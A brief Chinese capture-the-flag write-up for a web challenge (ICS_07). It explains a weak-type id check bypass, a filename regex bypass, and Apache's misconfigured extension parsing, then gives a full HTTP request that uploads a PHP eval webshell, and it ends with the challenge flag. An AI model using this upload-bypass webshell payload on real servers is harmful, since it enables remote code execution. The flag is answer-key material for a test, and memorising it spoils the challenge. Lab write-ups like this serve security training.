# ICS_07

> 弱语言特性,正则绕过,文件上传解析漏洞

## Apache2 配置不当解析漏洞

> Apache配置不当时,解析⽂件名的⽅式是从后向前识别扩展名,直到遇⻅Apache可识别的扩展名为⽌. 如:/shell.php.ddd.ccc.bbbb,会被当做/shell.php来解析

## 思路分析

> 打开网站,点击项目管理,点击view-source,看到了源代码.从代码中分析得知,需要先获取管理权限,获取管理权限需要麻烦的条件是传入的id不能为空、id的浮点值不能是1,id的最后一位是9.可以使用1a9来进行绕过,代码中有做sql注入防御.继续分析代码,剩下就是上传webshell文件了.文件名会和"backup/"进行拼接,后面会有chdir('uploaded')重新定义上传目录,所以需要绕过和"backup/"拼接限制,用..可以绕过,正则对文件名进行了过滤,只会检查最后一个.后面的后缀,可以用1.php/.来进行绕过,目标又存在apache2配置不当文件解析漏洞,正好利用文件解析漏洞进行绕过.

## payload

```
POST /index.php?page=index.php&id=1a9 HTTP/1.1
Host: 61.147.171.105:62221
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:62221/index.php?page=12&id=1&submit=%E6%8F%90%E4%BA%A4
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; PHPSESSID=gaa2h59g20n468lspdhk370bh6
Connection: close
Content-Length: 77

con=<?php @eval($_POST[cmd]);?>&file=../1.php/.
```

## flag

> cyberpeace{d2f720b48b37fca33797773be4a3c755}